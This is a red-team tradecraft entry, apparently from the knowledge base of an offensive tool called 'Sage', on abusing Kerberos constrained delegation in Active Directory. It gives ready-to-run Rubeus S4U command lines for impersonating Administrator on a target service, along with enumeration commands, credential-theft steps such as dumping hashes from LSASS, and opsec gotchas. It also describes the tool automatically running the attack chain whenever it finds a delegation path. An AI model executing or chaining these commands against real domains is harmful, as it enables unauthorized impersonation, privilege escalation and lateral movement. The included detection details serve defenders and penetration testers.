---
name: Constrained Delegation Abuse
category: delegation-abuse
subcategories: [constrained-delegation, s4u2self, s4u2proxy, protocol-transition]
tradecraft_tags: [constrained-delegation, s4u, protocol-transition, kerberos, technique, impersonation]
mitre_attack:
  - id: T1558
    name: Steal or Forge Kerberos Tickets
source:
  url: https://docs.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview
  license: none
  maintained: false
binary_type: none
binary_filename: ""
supported_os: [windows]
architecture: [x64]
privilege_required: domain-user
network_required: true
detection_signal: |
  S4U2self + S4U2proxy ticket requests are visible in DC Kerberos logs (Event 4769 with
  S4U flag). S4U requests from non-server contexts are anomalous. MDI has constrained
  delegation abuse detection for unusual S4U sequences. The service ticket obtained via
  S4U2proxy appears as a normal TGS in target service logs.
usage_examples:
  - description: Constrained delegation abuse with Rubeus S4U chain (user account with TGT)
    args: "Rubeus.exe s4u /user:JON.SNOW /rc4:<nthash> /impersonateuser:Administrator /msdsspn:cifs/winterfell.north.sevenkingdoms.local /altservice:host,winrm /ptt"
  - description: Constrained delegation from TGT file
    args: "Rubeus.exe s4u /ticket:<base64TGT> /impersonateuser:Administrator /msdsspn:cifs/TARGET.DOMAIN /ptt"
  - description: Check which accounts have constrained delegation configured
    args: "PowerView: Get-DomainUser -TrustedToAuth; Get-DomainComputer -TrustedToAuth"
opsec_notes: |
  Constrained delegation abuse requires credentials for the account that has delegation
  configured (msDS-AllowedToDelegateTo). If it's a user account, you need the user's
  hash or TGT. If it's a machine account, you need local admin on that machine (to
  extract the machine account's credentials via Rubeus tgtdeleg or mimikatz). The
  /altservice trick allows expanding a TGS from one service to another on the same machine.
gotchas: |
  The account must have "Trust this user for delegation to specified services" (constrained
  delegation) AND "Use any authentication protocol" (protocol transition) for S4U2self to
  work without a pre-existing user TGT. Without protocol transition, S4U2self requires
  the user to have an active TGS to the service first. Always check for protocol transition
  in SharpHound (TrustedToAuth flag). /altservice only works for services on the SAME
  machine as the original msdsspn.
related_ttps: [rubeus, sharphound, bloodhound-ingest, powerview]
alternatives: [unconstrained-delegation-abuse, rbcd-abuse]
common_args: {}
last_updated: 2026-05-29
---

# Constrained Delegation Abuse

A technique that abuses the S4U2self + S4U2proxy Kerberos extensions available to
accounts configured for constrained delegation (msDS-AllowedToDelegateTo set). When an
account has "Trust for delegation to specified services with any protocol" (protocol
transition), Rubeus can forge a service ticket impersonating any user to the specified
service — without that user's credentials.

## The Attack Chain

```
Prerequisite: Credentials for an account with constrained delegation configured
              (msDS-AllowedToDelegateTo set, with "Use any authentication protocol")

1. Enumerate: Get-DomainUser -TrustedToAuth or Get-DomainComputer -TrustedToAuth
2. Obtain credentials: steal token from machine account (Rubeus tgtdeleg) or
   extract NT hash from LSASS for the delegating account
3. S4U chain:
   Rubeus.exe s4u /user:DELEGATING_USER /rc4:<nthash> \
     /impersonateuser:Administrator \
     /msdsspn:cifs/TARGET.DOMAIN \
     /altservice:host,winrm,cifs \
     /ptt
4. TGS for Administrator@cifs/TARGET is injected; access TARGET as Administrator
```

## Typical use cases
- Lateral movement via a compromised service account with delegation rights
- Escalate from machine account compromise to admin on the delegated service host
- Pivot to additional machines when constrained delegation spans multiple SPNs

## How Sage uses this
SharpHound identifies delegation chains in BloodHound (GenericAll → TrustedToAuth paths).
Sage orchestrates the Rubeus S4U chain automatically when a delegation path is identified.
The key parameter is the msdsspn from the delegation configuration.

## Key distinctions

| Type | Protocol Transition | S4U2self works? |
|------|--------------------|--------------------|
| Constrained (Kerberos-only) | No | Only with existing TGS to service |
| Constrained (Any protocol) | Yes | Yes — impersonate any user |
| Unconstrained | N/A | TGT forwarded; Rubeus monitor needed |
| RBCD | N/A | Via attacker-controlled account |
